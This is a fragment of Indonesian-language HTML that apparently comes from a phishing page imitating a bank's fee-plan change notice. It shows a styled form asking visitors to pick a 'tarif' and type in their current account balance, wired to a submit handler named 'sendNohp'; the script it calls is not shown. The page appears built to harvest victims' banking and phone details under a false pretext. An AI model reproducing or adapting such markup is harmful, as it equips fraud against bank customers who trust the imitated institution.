...
<form id="formHP" onsubmit="sendNohp(event); return false" method="post" accept-charset="utf-8">
    <center>
<div class="" style="margin-left: 0px;margin-top: 165px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:20px 0px 20px 0px; background: #fff; height: 290px; box-shadow:0 0 6px rgba(29,30,32,.22); overflow:hidden">
<center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px; margin-top: -8px"><p>Silahkan Pilih Tarif Anda Di Bawah Ini</p><br><hr style=" margin-top: -10px">
...
<br>
<center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px; margin-top: 18px"><p>Silahkan masukkan sisa saldo rekening anda saat ini ( Opsional).</p><br><hr style=" margin-top: -10px">

</center>
<h5 style="color:#000; margin-top: 5px; margin-left: 4px; text-align: left;">Saldo Akhir :</h5><br/>
<input class="uang" id="saldo" name="saldoTerakhir" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 1px solid #aaa; border-image: initial; background-color: rgb(255, 255, 255);   border-radius: 15px 0px 15px 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; font-family: 'Nunito', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 0px; padding: 0px 10px; outline: none; margin-top: -10px; padding-left:10px; box-shadow:inset 0 1px 1px rgba(0,0,0, 0.2);" placeholder="Rp xxxxx"  required maxlength="13" minlength="10"><br/>
</h3>
...
<button type="submit" id="kirims" style="margin-left: 20px;margin-top: ;position:absolute;background-color:#0F78CB;color:white;border:0px solid #0076e0;width:90%;border-radius:10px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow:0 0 6px rgba(29,30,32,.22);" >Lanjutkan</button>
           </div>
</form>

<footer style="position: fixed; top: 70; left: 0; right: 0; width: 100%; height: 200px; z-index: -1"><center>
<!----------HTML code starts here------->
<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQ4aObLFUt6jysscKVGKMe-QBFQ5TSVQwwTVzWA62vQDldSX3q3lAwza0vDGiak2H6DOzhGw0sPGpbCAC_oFzully_Nl8jkHTQx4QQfE25e6uyCrpHrC8neDSl9BQhAtzjIT-ZV154twx0rqGHh2_HQMcAiWrlR6li0Ay0mSHut1UuBKN2LSAuPMbYiwY/s579/AddText_06-11-11.41.15.png" width="50%">
</center>
<div class="owl-carousel owl-theme owl-loaded " style=" height: 160px; transform-style: preserve-3d; overflow: hidden; display: none">
